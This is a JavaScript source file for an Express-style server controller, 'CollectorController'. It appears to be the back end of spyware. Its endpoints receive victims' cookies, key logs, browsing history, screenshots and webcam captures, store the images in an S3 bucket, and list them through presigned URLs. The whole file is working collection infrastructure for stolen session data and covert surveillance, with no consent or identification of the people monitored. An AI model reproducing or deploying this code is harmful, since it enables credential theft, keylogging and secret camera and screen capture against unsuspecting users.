import {s3Client} from "../http_server.js";
import {GetObjectCommand, ListObjectsCommand, PutObjectCommand} from "@aws-sdk/client-s3";
import {DateTime} from "luxon";
import { v4 as uuidv4 } from 'uuid';
import {getSignedUrl} from "@aws-sdk/s3-request-presigner";

class CollectorController {
    async saveCookies(req, res, _next) {
        const cookies = req.body;
        console.log('cookies', cookies);
        res.status(200).send({status: 'Cookies received'});
    }

    async saveKeys(req, res, _next) {
        console.log(req.body); // Logs the request body to the console
        return res.status(200).send({status: 'Key logs received'});
    }

    async saveHistory(req, res, _next) {
        const history = req.body;
        console.log('history', history);
        res.status(200).send({status: 'History received'});
    }

    async saveScreenshot(req, res, _next) {
        if (!req.body.dataUrl) {
            return res.status(400).send({status: 'Bad request'})
        }
        const buff = Buffer.from(req.body.dataUrl.replace('data:image/jpeg;base64,', ''), 'base64');

        // TODO: add client ID to the file name
        const imgName = `${uuidv4()}-${DateTime.now().toFormat('yyyy-MM-dd_HH-mm-ss')}`

        const command = new PutObjectCommand({
            Bucket: process.env.AWS_S3_BUCKET,
            Key: `screenshots/${imgName}.jpeg`,
            Body: buff,
        });

        try {
            const response = await s3Client.send(command);
            console.log(response);
        } catch (err) {
            console.error(err);
        }

        return res.status(200).send({status:'Screenshot received'})
    }

    async listScreenshots(req, res, _next) {
        const result = []

        let contents = [];
        const {Contents} = await s3Client.send(new ListObjectsCommand({Bucket: process.env.AWS_S3_BUCKET, Prefix: 'screenshots/'}))

        if (Contents) {
            contents = Contents;
        }

        for (const item of contents) {
            const command = new GetObjectCommand({Bucket: process.env.AWS_S3_BUCKET, Key: item.Key})
            const url = await getSignedUrl(s3Client, command, {expiresIn: 24 * 60 * 60})

            result.push({
                url,
                name: item.Key,
                createdAt: item.LastModified
            })
        }

        res.json(result)
    }

    async saveCameraCapture(req, res, _next) {
        if (!req.body.dataUrl) {
            return res.status(400).send({status: 'Bad request'})
        }
        const buff = Buffer.from(req.body.dataUrl.replace('data:image/jpeg;base64,', ''), 'base64');

        // TODO: add client ID to the file name
        const imgName = `${uuidv4()}-${DateTime.now().toFormat('yyyy-MM-dd_HH-mm-ss')}`

        const command = new PutObjectCommand({
            Bucket: process.env.AWS_S3_BUCKET,
            Key: `camera/${imgName}.jpeg`,
            Body: buff,
        });

        try {
            const response = await s3Client.send(command);
            console.log(response);
        } catch (err) {
            console.error(err);
        }

        return res.status(200).send({status:'Camera capture received'})
    }

    async listCameraCaptures(req, res, _next) {
        const result = []

        let contents = [];
        const {Contents} = await s3Client.send(new ListObjectsCommand({Bucket: process.env.AWS_S3_BUCKET, Prefix: 'camera/'}))

        if (Contents) {
            contents = Contents;
        }

        for (const item of contents) {
            const command = new GetObjectCommand({Bucket: process.env.AWS_S3_BUCKET, Key: item.Key})
            const url = await getSignedUrl(s3Client, command, {expiresIn: 24 * 60 * 60})

            result.push({
                url,
                name: item.Key,
                createdAt: item.LastModified
            })
        }

        res.json(result)
    }
}

export default new CollectorController()
